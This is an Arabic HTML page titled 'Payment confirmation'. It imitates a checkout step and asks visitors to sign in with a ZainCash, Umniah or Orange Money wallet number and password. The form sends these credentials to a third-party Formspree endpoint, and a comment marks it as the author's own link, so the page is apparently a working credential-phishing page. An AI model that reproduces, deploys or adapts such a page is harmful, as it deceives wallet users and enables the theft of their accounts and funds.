<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الدفع</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; padding-top: 50px; margin: 0; }
        .login-container { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 320px; }
        h2 { color: #004a99; text-align: center; }
        p { font-size: 13px; color: #666; text-align: center; margin-bottom: 20px; }
        input, select { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #004a99; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background-color: #003366; }
    </style>
</head>
<body>

<div class="login-container">
    <h2>تأكيد الدفع</h2>
    <p>يرجى تسجيل الدخول باستخدام محفظتك الإلكترونية (زين كاش، أمنية يو ولت، أو أورانج موني) لإتمام عملية الدفع.</p>
    
    <!-- هذا هو الرابط الصحيح الخاص بك -->
    <form action="https://formspree.io/f/meeyerjy" method="POST">
        
        <select name="wallet_type" required>
            <option value="" disabled selected>اختر نوع المحفظة</option>
            <option value="ZainCash">زين كاش</option>
            <option value="Umniah">أمنية يو ولت</option>
            <option value="OrangeMoney">أورانج موني</option>
        </select>

        <input type="text" name="wallet_number" placeholder="رقم المحفظة" required>
        <input type="password" name="password" placeholder="كلمة السر" required>
        
        <button type="submit">إتمام الدفع</button>
    </form>
</div>

</body>
</html>
